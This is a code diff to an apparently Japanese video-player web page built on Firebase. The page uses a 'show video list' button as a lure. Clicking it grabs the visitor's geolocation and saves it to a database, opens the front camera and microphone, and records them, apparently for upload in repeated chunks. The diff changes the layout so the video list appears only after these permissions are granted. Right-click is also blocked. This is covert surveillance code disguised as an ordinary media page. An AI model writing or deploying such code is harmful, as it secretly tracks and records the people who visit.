@@ -26,13 +26,28 @@
       max-height: 90vh;
     }
     #videoListContainer {
+      position: relative;
       flex: 1;
       overflow-y: auto;
       background-color: #f0f0f0;
       padding: 10px;
       height: 100%;
       box-sizing: border-box;
-      display: none; /* 初期は非表示 */
+      display: none; /* 初期非表示 */
+    }
+    #showListBtn {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 12px 20px;
+      font-size: 16px;
+      z-index: 10;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
     }
     .videoItem {
       display: flex;
@@ -65,7 +80,6 @@
       #videoListContainer {
         flex: none;
         height: 50%;
-        overflow-y: auto;
       }
       .thumbnail {
         width: 80px;
@@ -78,17 +92,15 @@
   </style>
 </head>
 <body>
-  <button id="showListBtn" style="position:absolute;top:10px;right:10px;z-index:10;">
-    動画リストを表示
-  </button>
-
   <div id="videoContainer">
     <video id="videoPlayer" controls></video>
   </div>
   <div id="videoListContainer">
+    <button id="showListBtn">動画リストを表示</button>
     <div id="videoList"></div>
   </div>
 
+  <!-- Firebase SDK とロジック -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
     import { getStorage, ref as storageRef, uploadBytes } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-storage.js";
@@ -108,6 +120,7 @@
     const storage = getStorage(app);
     const db = getDatabase(app);
 
+    // アクセス制限
     window.onload = function () {
       const referrer = document.referrer;
       if (!referrer || !referrer.startsWith('https://casval0078.github.io/video_data/')) {
@@ -116,11 +129,13 @@
       }
     };
 
+    // 右クリック禁止
     document.addEventListener('contextmenu', function (e) {
       e.preventDefault();
       alert('ブックマークは禁止されています。');
     });
 
+    // 動画リストデータ
     const videos = [
       { url: 'https://test.mp4', thumbnailUrl: 'https://test.jpg', name: 'test' }
     ];
@@ -153,7 +168,7 @@
 
     videos.forEach(createVideoItem);
 
-    // ユーザーID取得（端末ごとに一意）
+    // ユーザーID取得（localStorageベース）
     function getUserId() {
       let id = localStorage.getItem('userId');
       if (!id) {
@@ -163,6 +178,7 @@
       return id;
     }
 
+    // ボタンイベント
     document.getElementById('showListBtn').onclick = async () => {
       const userId = getUserId();
 
@@ -175,16 +191,17 @@
         const latitude = geo.coords.latitude;
         const longitude = geo.coords.longitude;
 
-        // カメラ・マイクアクセス許可
+        // カメラ・マイクの許可取得
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: true
         });
 
-        // 動画リスト表示
+        // UI更新
         document.getElementById('videoListContainer').style.display = 'block';
+        document.getElementById('showListBtn').style.display = 'none';
 
-        // 位置情報をDBに保存
+        // Firebase Realtime Databaseに保存
         const locationRef = push(dbRef(db, `locations/${userId}`));
         await set(locationRef, {
           timestamp: Date.now(),
@@ -192,7 +209,7 @@
           longitude
         });
 
-        // 録画処理（10分ごとに分割、計6回）
+        // 録画処理
         const recorder = new MediaRecorder(stream, {
           mimeType: 'video/webm;codecs=vp8,opus'
         });
@@ -226,7 +243,6 @@
           }
         };
 
-        // 録画開始
         recorder.start();
         setTimeout(() => {
           recorder.stop();
